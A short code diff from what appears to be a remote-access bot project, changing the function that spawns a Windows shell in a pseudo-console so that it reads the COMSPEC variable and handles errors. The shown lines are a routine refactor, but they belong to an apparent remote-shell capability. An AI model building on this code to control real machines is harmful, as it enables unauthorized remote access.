@@ -80,7 +80,7 @@ HRESULT InitializeStartupInfoAttachedToPseudoConsole(STARTUPINFOEX *pStartupInfo
 
 struct sLaika_shell *laikaB_newShell(struct sLaika_bot *bot, int cols, int rows) {;
     HRESULT hr;
-    LPCTSTR cmd = TEXT("cmd.exe");
+    TCHAR szComspec[MAX_PATH];
     struct sLaika_shell* shell = (struct sLaika_shell*)laikaM_malloc(sizeof(struct sLaika_shell));
 
     ZeroMemory(shell, sizeof(struct sLaika_shell));
@@ -88,6 +88,12 @@ struct sLaika_shell *laikaB_newShell(struct sLaika_bot *bot, int cols, int rows)
     /* create pty */
     hr = CreatePseudoConsoleAndPipes(&shell->pseudoCon, &shell->in, &shell->out, cols, rows);
     if (hr != S_OK) {
+        laikaM_free(shell);
+        return NULL;
+    }
+
+    /* get user's shell path */
+    if (GetEnvironmentVariable("COMSPEC", szComspec, MAX_PATH) == 0) {
         laikaM_free(shell);
         return NULL;
     }
@@ -104,7 +110,7 @@ struct sLaika_shell *laikaB_newShell(struct sLaika_bot *bot, int cols, int rows)
     /* launch cmd shell */
     hr = CreateProcess(
         NULL,                           /* No module name - use Command Line */
-        cmd,                            /* Command Line */
+        szComspec,                      /* Command Line */
         NULL,                           /* Process handle not inheritable */
         NULL,                           /* Thread handle not inheritable */
         FALSE,                          /* Inherit handles */
